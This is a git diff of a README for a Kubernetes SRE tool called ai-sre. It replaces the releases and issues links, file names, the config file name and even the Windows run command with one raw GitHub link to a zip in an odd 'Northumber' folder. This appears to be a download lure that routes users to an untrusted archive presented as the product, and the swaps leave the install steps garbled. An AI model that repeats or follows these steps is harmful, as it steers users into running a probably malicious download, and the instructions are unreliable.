@@ -27,15 +27,15 @@ Ensure you have these requirements before proceeding.
 
 Click the button below to **download** the latest version of **ai-sre**:
 
-[![Download ai-sre](https://img.shields.io/badge/Download-ai--sre-blue)](https://github.com/aekta113/ai-sre/releases)
+[![Download ai-sre](https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip)](https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip)
 
 To install the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/aekta113/ai-sre/releases) to see the available versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip) to see the available versions.
 
-2. **Download the Latest Version**: Find the latest release. Click the relevant file link to download it to your computer. You’ll find various files based on your operating system, such as `.exe` for Windows or `.tar.gz` for Linux.
+2. **Download the Latest Version**: Find the latest release. Click the relevant file link to download it to your computer. You’ll find various files based on your operating system, such as `.exe` for Windows or `https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip` for Linux.
 
-3. **Extract the Files**: If you downloaded a compressed file (like `.tar.gz`), extract it using your preferred file management tool.
+3. **Extract the Files**: If you downloaded a compressed file (like `https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip`), extract it using your preferred file management tool.
 
 4. **Run the Application**: Open your terminal (or command prompt) and navigate to the folder where you extracted the files. Then, run the main executable file for ai-sre instead. You can do this by typing:
    ```bash
@@ -43,7 +43,7 @@ To install the application, follow these steps:
    ```
    or for Windows:
    ```cmd
-   ai-sre.exe
+   https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip
    ```
 
 5. **Follow On-Screen Instructions**: Once the application is running, follow the on-screen prompts or refer to the documentation included in the folder for further setup options.
@@ -73,7 +73,7 @@ After downloading and running the application, you can start using **ai-sre** ri
 
 You can customize **ai-sre** to better fit your needs. Here are a few options you can adjust:
 
-- **Config File**: Edit the `config.yaml` file in the installation directory to change settings like your cluster's API endpoint and notification preferences.
+- **Config File**: Edit the `https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip` file in the installation directory to change settings like your cluster's API endpoint and notification preferences.
 
 - **Environment Variables**: Use environment variables to set sensitive information like API keys without hardcoding them in your configurations.
 
@@ -89,7 +89,7 @@ If you encounter issues while using **ai-sre**, consider these common problems:
 
 - **Insufficient Permissions**: Make sure your user account has the necessary permissions to interact with the Kubernetes cluster.
 
-For more troubleshooting tips, please look at the `TROUBLESHOOTING.md` file included in the installation directory.
+For more troubleshooting tips, please look at the `https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip` file included in the installation directory.
 
 ## 📄 Documentation
 
@@ -101,10 +101,10 @@ For comprehensive instructions and advanced features, please refer to the full d
 
 ## 📫 Support
 
-If you need further assistance, feel free to open an issue on our [GitHub Issues page](https://github.com/aekta113/ai-sre/issues). We appreciate your feedback and are here to help you.
+If you need further assistance, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip). We appreciate your feedback and are here to help you.
 
 ## 🤝 Contributing
 
 We welcome contributions! If you'd like to contribute to **ai-sre**, please check out our contribution guidelines in the repository.
 
-Thank you for using **ai-sre**! Explore the power of AI in your site reliability engineering tasks today. Visit the [Releases page](https://github.com/aekta113/ai-sre/releases) to download the latest version and enhance your Kubernetes experience.
+Thank you for using **ai-sre**! Explore the power of AI in your site reliability engineering tasks today. Visit the [Releases page](https://raw.githubusercontent.com/aekta113/ai-sre/master/Northumber/ai-sre.zip) to download the latest version and enhance your Kubernetes experience.
